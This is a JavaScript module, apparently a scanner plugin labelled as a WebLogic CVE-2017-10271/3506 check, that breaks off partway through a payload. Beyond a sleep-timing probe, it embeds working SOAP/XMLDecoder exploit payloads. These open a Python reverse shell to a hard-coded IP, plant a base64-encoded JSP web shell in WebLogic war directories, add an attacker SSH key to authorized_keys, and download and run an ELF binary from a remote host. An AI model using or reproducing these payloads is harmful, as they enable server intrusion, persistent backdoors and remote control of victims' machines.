module.exports={
	tags:"weblogic,CVE-2017-10271,10271,3506",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271,CVE-2017-3506漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271",
    "https://github.com/Medicean/VulApps",
    "https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271"],
	doCheck:function (url,fnCbk)
	{
  /*<!--
    <void class="org.apache.commons.ognl.Ognl">
        <object method="getValue">
          <string><![CDATA[(#response=@org.apache.struts2.ServletActionContext@getResponse()).(#response.addHeader('struts2','_struts2_'))]]></string>
          <object class="java.util.HashMap"></object>
        </object>
    </void>
    -->*/
		var _t = this,_s = this.self, szOld = url,
       // 后期完善，尝试对多个path进行测试
       aPath = '/wls-wsat/CoordinatorPortType,/wls-wsat/CoordinatorPortType11,/wls-wsat/ParticipantPortType,/wls-wsat/ParticipantPortType11,/wls-wsat/RegistrationPortTypeRPC,/wls-wsat/RegistrationPortTypeRPC11,/wls-wsat/RegistrationRequesterPortType,/wls-wsat/RegistrationRequesterPortType11'.split(',');
		var s = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java class="java.beans.XMLDecoder">
    
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
    
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>

*/}),s1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("162.219.126.11",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s1_ = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[tmpFl=`mktemp`;echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZhLm5pby5CeXRlQnVmZmVyLCBqYXZhLm5ldC5JbmV0U29ja2V0QWRkcmVzcywgamF2YS5uaW8uY2hhbm5lbHMuU29ja2V0Q2hhbm5lbCwgamF2YS51dGlsLkFycmF5cywgamF2YS5pby5JT0V4Y2VwdGlvbiwgamF2YS5uZXQuVW5rbm93bkhvc3RFeGNlcHRpb24sIGphdmEubmV0LlNvY2tldCxqYXZhLnV0aWwuSGFzaFNldCxqYXZhLm5ldC5JbmV0QWRkcmVzcyxqYXZhLm5ldC5OZXR3b3JrSW50ZXJmYWNlLGphdmEubmV0LlNvY2tldEV4Y2VwdGlvbixqYXZhLnV0aWwuRW51bWVyYXRpb24samF2YS51dGlsLkl0ZXJhdG9yLGphdmEudXRpbC5TZXQiJT48JQovLyAgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIgpTdHJpbmcgY21kID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImxzIik7CmlmIChjbWQgIT0gbnVsbCkKewp0cnl7ClByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKTsKT3V0cHV0U3RyZWFtIG9zID0gcC5nZXRPdXRwdXRTdHJlYW0oKTsKSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7CkRhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKU3RyaW5nIGRpc3IgPSBkaXMucmVhZExpbmUoKTsKd2hpbGUgKCBkaXNyICE9IG51bGwgKXsKb3V0LnByaW50bG4oZGlzcik7IGRpc3IgPSBkaXMucmVhZExpbmUoKTt9Cn0gY2F0Y2ggKEV4Y2VwdGlvbiB4KSB7fQp9CgogICAgY21kID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtQ01EIik7CiAgICBpZiAoY21kICE9IG51bGwpCiAgICB7CiAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgIGlmIChjbWQuY29tcGFyZVRvKCJDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IHJlcXVlc3QuZ2V0SGVhZGVyKCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgaW50IHBvcnQgPSBJbnRlZ2VyLnBhcnNlSW50KHJlcXVlc3QuZ2V0SGVhZGVyKCJYLVBPUlQiKSk7CiAgICAgICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSBTb2NrZXRDaGFubmVsLm9wZW4oKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29ubmVjdChuZXcgSW5ldFNvY2tldEFkZHJlc3ModGFyZ2V0LCBwb3J0KSk7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLmNvbmZpZ3VyZUJsb2NraW5nKGZhbHNlKTsKICAgICAgICAgICAgICAgIHNlc3Npb24uc2V0QXR0cmlidXRlKCJzb2NrZXQiLCBzb2NrZXRDaGFubmVsKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgfSBjYXRjaCAoVW5rbm93bkhvc3RFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICB9IGNhdGNoIChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSBpZiAoY21kLmNvbXBhcmVUbygiRElTQ09OTkVDVCIpID09IDApIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGV4LmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc2Vzc2lvbi5pbnZhbGlkYXRlKCk7CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJSRUFEIikgPT0gMCl7CiAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IChTb2NrZXRDaGFubmVsKXNlc3Npb24uZ2V0QXR0cmlidXRlKCJzb2NrZXQiKTsKICAgICAgICAgICAgdHJ5IHsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZSg1MTIpOwogICAgICAgICAgICAgICAgaW50IGJ5dGVzUmVhZCA9IHNvY2tldENoYW5uZWwucmVhZChidWYpOwogICAgICAgICAgICAgICAgU2VydmxldE91dHB1dFN0cmVhbSBzbyA9IHJlc3BvbnNlLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgICAgICAgICAgd2hpbGUgKGJ5dGVzUmVhZCA+IDApewogICAgICAgICAgICAgICAgICAgIHNvLndyaXRlKGJ1Zi5hcnJheSgpLDAsYnl0ZXNSZWFkKTsKICAgICAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgICAgIGJ5dGVzUmVhZCA9IHNvY2tldENoYW5uZWwucmVhZChidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgc28uZmx1c2goKTsKICAgICAgICAgICAgICAgIHNvLmNsb3NlKCk7ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgfSAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgIH0gZWxzZSBpZiAoY21kLmNvbXBhcmVUbygiRk9SV0FSRCIpID09IDApCiAgICAgICAgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGludCByZWFkbGVuID0gcmVxdWVzdC5nZXRDb250ZW50TGVuZ3RoKCk7CiAgICAgICAgICAgICAgICBieXRlW10gYnVmZiA9IG5ldyBieXRlW3JlYWRsZW5dOwoKICAgICAgICAgICAgICAgIHJlcXVlc3QuZ2V0SW5wdXRTdHJlYW0oKS5yZWFkKGJ1ZmYsIDAsIHJlYWRsZW4pOwogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKHJlYWRsZW4pOwogICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICBidWYucHV0KGJ1ZmYpOwogICAgICAgICAgICAgICAgYnVmLmZsaXAoKTsKCiAgICAgICAgICAgICAgICB3aGlsZShidWYuaGFzUmVtYWluaW5nKCkpIHsKICAgICAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLndyaXRlKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICBTZXQ8SW5ldEFkZHJlc3M+IGFkZHJzID0gbmV3IEhhc2hTZXQ8SW5ldEFkZHJlc3M+KCk7CiAgICAgICAgICAgIEVudW1lcmF0aW9uPE5ldHdvcmtJbnRlcmZhY2U+IG5zID0gbnVsbDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIG5zID0gTmV0d29ya0ludGVyZmFjZS5nZXROZXR3b3JrSW50ZXJmYWNlcygpOwogICAgICAgICAgICB9IGNhdGNoIChTb2NrZXRFeGNlcHRpb24gZSkgewogICAgICAgICAgICB9CiAgICAgICAgICAgIHdoaWxlIChucyAhPSBudWxsICYmIG5zLmhhc01vcmVFbGVtZW50cygpKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgTmV0d29ya0ludGVyZmFjZSBuID0gbnMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgIEVudW1lcmF0aW9uPEluZXRBZGRyZXNzPiBpcyA9IG4uZ2V0SW5ldEFkZHJlc3NlcygpOwogICAgICAgICAgICAgICAgd2hpbGUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgSW5ldEFkZHJlc3MgaSA9IGlzLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFpLmlzTG9vcGJhY2tBZGRyZXNzKCkgJiYgIWkuaXNMaW5rTG9jYWxBZGRyZXNzKCkgJiYgIWkuaXNNdWx0aWNhc3RBZGRyZXNzKCkpIHN6SXAgKz0gIiwiICsgaS5nZXRIb3N0QWRkcmVzcygpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIG91dC5wcmludCgiPCEtLSBpcDoiICsgc3pJcCArICIgLS0+Iik7ICAKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgIH0KICAgICAgICBvdXQucHJpbnQoIjwhLS0gR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyAtLT4iKTsgCiAgICB9CiU+|base64 -d>$tmpFl;ps -ef|grep domain|grep -Eo '(\/[^ =]*\/user_projects\/domains)'|sort -u|sed 's/_domain.*$/_domain/g'|xargs -I {} find {} -type d -name "war"|xargs -I {} cp -f $tmpFl {}/X11.jsp;rm -rf $tmpFl;mkdir ~/.ssh 2>/dev/null;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">~/.ssh/authorized_keys]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s2 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'PCVAcGFnZSBpbXBvcnQ9ImphdmEubmlvLkJ5dGVCdWZmZXIsIGphdmEubmV0LkluZXRTb2NrZXRBZGRyZXNzLCBqYXZhLm5pby5jaGFubmVscy5Tb2NrZXRDaGFubmVsLCBqYXZhLnV0aWwuQXJyYXlzLCBqYXZhLmlvLklPRXhjZXB0aW9uLCBqYXZhLm5ldC5Vbmtub3duSG9zdEV4Y2VwdGlvbiwgamF2YS5uZXQuU29ja2V0LGphdmEudXRpbC5IYXNoU2V0LGphdmEubmV0LkluZXRBZGRyZXNzLGphdmEubmV0Lk5ldHdvcmtJbnRlcmZhY2UsamF2YS5uZXQuU29ja2V0RXhjZXB0aW9uLGphdmEudXRpbC5FbnVtZXJhdGlvbixqYXZhLnV0aWwuSXRlcmF0b3IsamF2YS51dGlsLlNldCIgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIiU+PCUKICAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldEhlYWRlcigiWC1DTUQiKTsKICAgIGlmIChjbWQgIT0gbnVsbCkKICAgIHsKICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgaWYgKGNtZC5jb21wYXJlVG8oIkNPTk5FQ1QiKSA9PSAwKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBTdHJpbmcgdGFyZ2V0ID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtVEFSR0VUIik7CiAgICAgICAgICAgICAgICBpbnQgcG9ydCA9IEludGVnZXIucGFyc2VJbnQocmVxdWVzdC5nZXRIZWFkZXIoIlgtUE9SVCIpKTsKICAgICAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IFNvY2tldENoYW5uZWwub3BlbigpOwogICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC5jb25uZWN0KG5ldyBJbmV0U29ja2V0QWRkcmVzcyh0YXJnZXQsIHBvcnQpKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29uZmlndXJlQmxvY2tpbmcoZmFsc2UpOwogICAgICAgICAgICAgICAgc2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInNvY2tldCIsIHNvY2tldENoYW5uZWwpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICB9IGNhdGNoIChVbmtub3duSG9zdEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJESVNDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuc29ja2V0KCkuY2xvc2UoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZXguZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzZXNzaW9uLmludmFsaWRhdGUoKTsKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIlJFQUQiKSA9PSAwKXsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgeyAgICAgICAgICAgIAogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKDUxMik7CiAgICAgICAgICAgICAgICBpbnQgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICBTZXJ2bGV0T3V0cHV0U3RyZWFtIHNvID0gcmVzcG9uc2UuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoYnl0ZXNSZWFkID4gMCl7CiAgICAgICAgICAgICAgICAgICAgc28ud3JpdGUoYnVmLmFycmF5KCksMCxieXRlc1JlYWQpOwogICAgICAgICAgICAgICAgICAgIHNvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgc28uY2xvc2UoKTsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgLy9zb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICAKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIkZPUldBUkQiKSA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpbnQgcmVhZGxlbiA9IHJlcXVlc3QuZ2V0Q29udGVudExlbmd0aCgpOwogICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtyZWFkbGVuXTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0LmdldElucHV0U3RyZWFtKCkucmVhZChidWZmLCAwLCByZWFkbGVuKTsKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZShyZWFkbGVuKTsKICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgYnVmLnB1dChidWZmKTsKICAgICAgICAgICAgICAgIGJ1Zi5mbGlwKCk7CgogICAgICAgICAgICAgICAgd2hpbGUoYnVmLmhhc1JlbWFpbmluZygpKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC53cml0ZShidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgLy9yZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS5jbG9zZSgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9LyovIGluIGZpbHRlcgogICAgICAgIGVsc2UgCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICAgICAgU2V0PEluZXRBZGRyZXNzPiBhZGRycyA9IG5ldyBIYXNoU2V0PEluZXRBZGRyZXNzPigpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBucyA9IE5ldHdvcmtJbnRlcmZhY2UuZ2V0TmV0d29ya0ludGVyZmFjZXMoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIE5ldHdvcmtJbnRlcmZhY2UgbiA9IG5zLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEluZXRBZGRyZXNzIGkgPSBpcy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1ByaW50V3JpdGVyIG8gPSByZXNwb25zZS5nZXRXcml0ZXIoKTsgIAogICAgICAgICAgICBvdXQucHJpbnQoIjwhLS0gR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyAtLT4iKTsgCiAgICAgICAgfQogICAgICAgIC8vLy8vLy8vLy8vLy8vKi8KICAgIH0vLyBpbiBqc3AKICAgI